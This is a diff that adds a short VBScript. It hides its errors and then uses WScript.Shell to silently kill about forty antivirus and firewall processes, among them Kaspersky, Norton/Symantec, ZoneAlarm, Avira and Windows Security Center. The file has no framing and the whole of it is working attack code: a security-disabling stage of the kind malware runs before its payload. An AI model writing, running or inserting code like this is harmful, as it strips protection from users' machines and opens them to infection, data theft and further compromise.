@@ -1,0 +1,43 @@
+On Error Resume Next
+set ws=WScript.CreateObject("WScript.Shell") 
+ws.run "tskill  KVFW",0
+ws.run "tskill  KAVPFW",0
+ws.run "tskill  Iparmor",0
+ws.run "tskill  TrojanHunter",0
+ws.run "tskill  THGUARD",0
+ws.run "tskill  PFW",0
+ws.run "tskill  ZONEALARM.EX",0
+ws.run "tskill  WFINDV32",0
+ws.run "tskill  VETTRAY",0
+ws.run "tskill  SPHINX",0
+ws.run "tskill  SMC",0
+ws.run "tskill  SCRSCAN",0
+ws.run "tskill  SCANPM",0
+ws.run "tskill  SAFEWEB",0
+ws.run "tskill  FESCUE",0
+ws.run "tskill  PERSFW",0
+ws.run "tskill  PCFWALLICON",0
+ws.run "tskill  PCCWIN98",0
+ws.run "tskill  PAVW",0
+ws.run "tskill  NAVAPW32",0
+ws.run "tskill  N32SCANW",0
+ws.run "tskill  MPFTRAY",0
+ws.run "tskill  FRW",0
+ws.run "tskill  FP-WIN",0
+ws.run "tskill  F-STOPW",0
+ws.run "tskill  vsmon",0
+ws.run "tskill  Avguard",0
+ws.run "tskill  MPFAgent",0
+ws.run "tskill  rfwmain",0
+ws.run "tskill  rfwsrv",0
+ws.run "tskill  KavPFW",0
+ws.run "tskill  KPfwSvc",0
+ws.run "tskill  SNDSrvc",0
+ws.run "tskill  SPBBCSvc",0
+ws.run "tskill  ccSetMgr",0
+ws.run "tskill  ccEvtMgr",0
+ws.run "tskill  symlcsvc",0
+ws.run "tskill  ccApp",0
+ws.run "tskill  wscntfy",0
+ws.run "tskill  fyfirewall",0
+
